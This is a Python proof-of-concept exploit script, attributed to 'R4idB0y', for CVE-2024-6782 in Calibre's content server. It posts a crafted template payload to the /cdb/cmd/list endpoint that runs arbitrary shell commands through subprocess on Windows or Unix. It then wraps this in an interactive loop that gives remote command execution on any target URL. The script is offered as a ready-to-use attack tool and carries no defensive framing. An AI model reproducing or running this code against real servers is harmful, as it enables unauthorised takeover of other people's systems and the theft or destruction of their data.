import requests
import argparse
import sys

class Colors:
    OKGREEN = '\033[92m'
    ERROR = '\033[91m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'

def print_colored(text, color):
    print(f"{color}{text}{Colors.ENDC}")

def exploit(cmd, target):
    payload = (
        f"python:def evaluate(a, b):\n"
        f" import subprocess\n"
        f" try:\n"
        f"  return subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\n"
        f" except Exception:\n"
        f"  return subprocess.check_output(['sh', '-c', '{cmd}']).decode()"
    )

    try:
        r = requests.post(
            f"{target}/cdb/cmd/list",
            headers={"Content-Type": "application/json"},
            json=[["template"], "", "", "", 1, payload]
        )
        output = r.json().get("result", {}).get("data", {}).get("template", {}).get("2146", "No output found")
        print_colored(output, Colors.OKGREEN)
    except requests.RequestException:
        print_colored("Request error", Colors.ERROR)
        print_colored("[!] Failed to parse JSON response", Colors.WARNING)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit command execution tool.')
    parser.add_argument('--target', required=True, help='The target URL')
    args = parser.parse_args()

    banner = """
    ▄████▄   ▄▄▄       ██▓     ██▓ ▄▄▄▄    ██▀███  ▓█████ 
    ▒██▀ ▀█  ▒████▄    ▓██▒    ▓██▒▓█████▄ ▓██ ▒ ██▒▓█   ▀ 
    ▒▓█    ▄ ▒██  ▀█▄  ▒██░    ▒██▒▒██▒ ▄██▓██ ░▄█ ▒▒███   
    ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██░    ░██░▒██░█▀  ▒██▀▀█▄  ▒▓█  ▄ 
    ▒ ▓███▀ ░ ▓█   ▓██▒░██████▒░██░░▓█  ▀█▓░██▓ ▒██▒░▒████▒
    ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░▓  ░░▓  ░▒▓███▀▒░ ▒▓ ░▒▓░░░ ▒░ ░
      ░  ▒     ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░▒░▒   ░   ░▒ ░ ▒░ ░ ░  ░
    ░          ░   ▒     ░ ░    ▒ ░ ░    ░   ░░   ░    ░   
    ░ ░            ░  ░    ░  ░ ░   ░         ░        ░  ░
    ░                                    ░                  
    """
    print_colored(banner, Colors.OKGREEN)
    print_colored("                  Writed by R4idB0y", Colors.OKGREEN)
    print_colored("                  CVE-2024-6782-PoC             ", Colors.OKGREEN)
    print_colored("__________________________________________________________________", Colors.OKGREEN)

    while True:
        cmd = input("> ")
        exploit(cmd, args.target)
